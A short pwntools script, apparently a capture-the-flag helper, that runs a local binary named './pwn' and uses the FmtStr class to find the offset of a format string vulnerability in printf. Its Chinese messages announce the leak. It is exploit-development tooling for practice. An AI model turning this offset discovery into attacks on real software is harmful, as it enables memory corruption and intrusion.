from pwn import *



context(arch='i386',os='linux')
context.terminal=["tmux","splitw","-h"]



def exec_fmt(payload):
    r=process('./pwn')
    r.recvuntil(b'name:',drop=True)
    r.sendline(payload)
    return r.recv()

# gdb.attach(r, 'b printf')


if __name__ == '__main__':
    print("准备泄漏出(格式化字符串)在printf函数参数中的位置:")
    auto_fmtstr = FmtStr(exec_fmt)
    print("(格式化字符串)在printf函数中参数的位置是:{0}".format(auto_fmtstr.offset))
